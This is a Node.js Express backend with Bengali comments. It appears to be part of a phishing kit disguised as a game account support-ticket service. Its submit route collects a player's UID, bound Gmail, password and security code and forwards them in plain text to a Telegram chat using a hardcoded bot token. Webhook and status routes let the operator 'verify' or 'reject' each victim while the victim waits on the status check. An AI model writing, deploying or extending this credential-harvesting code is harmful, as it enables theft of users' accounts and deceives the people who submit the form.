const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

// ইউজার স্ট্যাটাস সেভ রাখার জন্য
let userStatuses = {}; 

// ১. ফর্ম সাবমিট রুট
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    userStatuses[uid] = "Pending";

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify", callback_data: `verify_${uid}` },
                        { text: "❌ Reject", callback_data: `reject_${uid}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Submitted successfully' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Telegram API Error' });
    }
});

// ২. টেলিগ্রাম বাটন ক্লিক (Webhook) রুট
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const callbackQuery = update.callback_query;
        const data = callbackQuery.data; 
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;

        const [action, uid] = data.split('_');

        if (action === 'verify') {
            userStatuses[uid] = "Verified";
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                parse_mode: 'Markdown'
            });
        } else if (action === 'reject') {
            userStatuses[uid] = "Rejected";
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED*`,
                parse_mode: 'Markdown'
            });
        }

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Status updated to ${action}!`
        });
    }

    res.sendStatus(200);
});

// ৩. লাইভ স্ট্যাটাস চেক রুট
app.get('/api/check-status/:uid', (req, res) => {
    const uid = req.params.uid;
    const status = userStatuses[uid] || "Pending";
    res.json({ success: true, status: status });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
